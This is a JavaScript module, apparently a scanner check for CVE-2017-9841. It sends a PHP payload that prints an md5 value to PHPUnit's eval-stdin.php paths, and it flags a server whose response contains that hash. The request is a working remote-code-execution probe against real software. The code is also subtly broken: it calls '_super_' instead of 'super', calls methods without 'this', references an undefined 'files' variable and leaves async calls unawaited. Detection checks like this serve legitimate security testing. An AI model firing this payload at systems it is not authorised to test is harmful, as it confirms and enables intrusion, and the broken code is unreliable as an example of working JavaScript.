const { CoreLayer, createReport, browerHttpJob, plain2md5 } = require('../core/core.js')

class phpunit_RCE_CVE_2017_9841 extends CoreLayer {
    constructor(_coreObj_) {
        _super_(_coreObj_);
        this.files = [];
    }

    async startTesting() {
        prepareFilesToBeTested();
        if (this.files.length > 0) {
            for (var i = 0; i < files.length; i++) {
                //trace("LOG: test on file:" + files[i]);
                testURI(files[i]);
            }
        }
    }

    async testURI(_uri_) {
        let randNum = 10 + Math.floor(Math.random() * 989);
        let expectedResult = plain2md5(randNum.toString());

        const lastJob = new browerHttpJob(this.browser);
        lastJob.method = "POST";
        lastJob.url = this.url;
        lastJob.uri = _uri_;
        lastJob.request.body = `<?php die(print(md5(${randNum})));`;
        lastJob.execute();

        if (!lastJob.wasError && lastJob.response.body.indexOf(expectedResult) >= 0) {

            const msg = { url: lastJob.url, body: "", payload: expectedResult, vuln: this.getVulnId(__filename), level: "h" }
            this.alert(createReport(msg));
        }
    }

    prepareFilesToBeTested() {
        this.files.push("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
        this.files.push("/phpunit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
    }
}

module.exports = phpunit_RCE_CVE_2017_9841; 